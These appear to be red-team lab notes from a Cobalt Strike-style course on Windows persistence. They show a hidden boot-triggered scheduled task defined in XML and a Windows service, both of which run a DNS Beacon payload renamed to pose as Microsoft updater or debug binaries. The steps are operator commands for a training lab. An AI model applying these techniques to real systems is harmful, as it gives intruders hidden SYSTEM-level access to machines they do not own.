# Kill Chain

## Task Scheduler <a href="#task-scheduler" id="task-scheduler"></a>

1.  Save the following XML template to the Attacker Desktop (e.g. C:\Payloads\task.xml)

    ```xml
    xmlTypeCopy<Task xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
    <Triggers>
        <BootTrigger>
            <Enabled>true</Enabled>
        </BootTrigger>
    </Triggers>
    <Principals>
        <Principal>
            <UserId>NT AUTHORITY\SYSTEM</UserId>
            <RunLevel>HighestAvailable</RunLevel>
        </Principal>
    </Principals>
    <Settings>
        <AllowStartOnDemand>true</AllowStartOnDemand>
        <Enabled>true</Enabled>
        <Hidden>true</Hidden>
    </Settings>
    <Actions>
        <Exec>
            <Command>"C:\Program Files\Microsoft Update Health Tools\updater.exe"</Command>
        </Exec>
    </Actions>
    </Task>
    ```
2. Change Beacon's current working directory.
   1. `cd C:\Program Files\Microsoft Update Health Tools`
3. Upload a DNS Beacon payload.
   1. `upload C:\Payloads\dns_x64.exe`
4. Rename the payload to something you think will help it to blend in.
   1. `mv dns_x64.exe updater.exe`
5.  Create the scheduled task.

    1. `schtaskscreate \Microsoft\Windows\WindowsUpdate\Updater XML CREATE`

    > A file dialogue window will appear for you to select the XML file.
6. Reboot [Workstation 1](https://labclient.labondemand.com/Instructions/cbc22f70-24db-45fb-ad52-3b45cf669430) and a new SYSTEM Beacon should appear.
7. Delete the task.
   1. `schtasksdelete \Microsoft\Windows\WindowsUpdate\Updater TASK`

## Windows Services <a href="#windows-services" id="windows-services"></a>

1. Change Beacon's current working directory.
   1. `cd C:\Windows\System32`
2. Upload a DNS Beacon service payload.
   1. `upload C:\Payloads\dns_x64.svc.exe`
3. Rename the payload to something you think will help it to blend in.
   1. `mv dns_x64.svc.exe debug_svc.exe`
4. Create the service.
   1. `sc_create dbgsvc "Debug Service" C:\Windows\System32\debug_svc.exe "Windows Debug Service" 0 2 3`
5. Reboot [Workstation 1](https://labclient.labondemand.com/Instructions/cbc22f70-24db-45fb-ad52-3b45cf669430) and a new SYSTEM Beacon should appear.
6. Delete the service.
   1. `sc_delete dbgsvc`
